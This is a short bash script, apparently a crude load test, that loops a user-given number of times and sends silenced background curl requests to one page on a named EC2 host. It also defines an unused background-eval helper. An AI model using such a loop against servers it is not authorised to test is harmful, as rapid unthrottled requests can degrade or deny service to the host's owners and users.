#!/bin/bash
# Run a command in the background.
echo "$a"
_evalBg() {
    eval "$@" &>/dev/null & disown;
}

START=1
END=$1
echo "Countdown"
 
for (( c=$START; c<=$END; c++ ))
do
	echo "$c hit done"
    curl http://ec2-13-58-159-91.us-east-2.compute.amazonaws.com/html/passwordStrengthChecker.html &>/dev/null &
done
